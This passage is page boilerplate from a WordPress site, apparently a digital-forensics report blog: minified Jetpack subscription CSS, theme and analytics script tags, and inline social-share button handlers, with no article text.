input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"14465\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "14465" ]);
/* ]]> */
</script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="0d6d1317a6f763bca75e4b49-|49" defer></script></body>
</html>
